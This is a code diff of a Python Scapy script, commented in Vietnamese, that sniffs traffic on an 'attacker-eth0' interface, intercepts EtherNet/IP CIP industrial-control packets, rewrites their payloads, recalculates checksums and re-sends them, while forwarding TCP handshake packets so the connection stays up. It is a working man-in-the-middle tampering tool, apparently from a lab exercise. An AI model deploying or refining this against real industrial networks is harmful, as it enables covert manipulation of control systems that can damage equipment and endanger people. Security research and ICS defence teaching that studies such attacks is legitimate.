@@ -35,28 +35,32 @@ def modify_payload(data):
 
 # Hàm xử lý gói tin
 def spoof_pkt(pkt):
-    if pkt.haslayer(IP) :
-        if pkt[TCP].dport == 44818 or pkt[TCP].sport == 44818:
-            newpkt = IP(bytes(pkt[IP]))
-            del(newpkt.chksum)
-            del(newpkt[TCP].chksum)
-            del(newpkt[TCP].payload)
+    if pkt.haslayer(IP) and pkt.haslayer(TCP):
+        # Forward các gói tin SYN và SYN-ACK để thiết lập kết nối TCP
+        if pkt[TCP].flags in ['S', 'SA']:
+            print(f"[*] Forwarding TCP {pkt[TCP].flags}")
+            send(pkt, verbose=False)
+            return
 
-            if pkt[TCP].payload:
-                data = pkt[TCP].payload.load
-                if b'CIP' in data:  # Kiểm tra nếu là gói tin CIP
-                    print("[*] CIP packet detected!")
-                    newdata = modify_payload(data)  # Sửa đổi dữ liệu CIP
-                    send(newpkt / newdata)
-                else:
-                    # Forward các gói không phải CIP
-                    send(newpkt / data)
-            else:
-                send(newpkt)
-        else:
-            send(pkt)
+        # Kiểm tra nếu gói TCP chứa payload CIP
+        if pkt[TCP].payload:
+            data = pkt[TCP].payload.load
+            if b'CIP' in data:  # Gói tin CIP
+                print("[*] CIP packet detected!")
+                newdata = modify_payload(data)  # Sửa đổi dữ liệu CIP
+                newpkt = IP(bytes(pkt[IP])) / newdata
+                del(newpkt.chksum, newpkt[TCP].chksum)
+                send(newpkt, verbose=False)
+                return
+        
+        # Forward gói tin TCP khác
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum, newpkt[TCP].chksum)
+        send(newpkt, verbose=False)
     else:
-        send(pkt)
+        # Forward các gói tin không phải TCP/IP
+        send(pkt, verbose=False)
+   
 # Lọc và chặn gói tin TCP
 pkt = sniff(iface='attacker-eth0', prn=spoof_pkt)
 
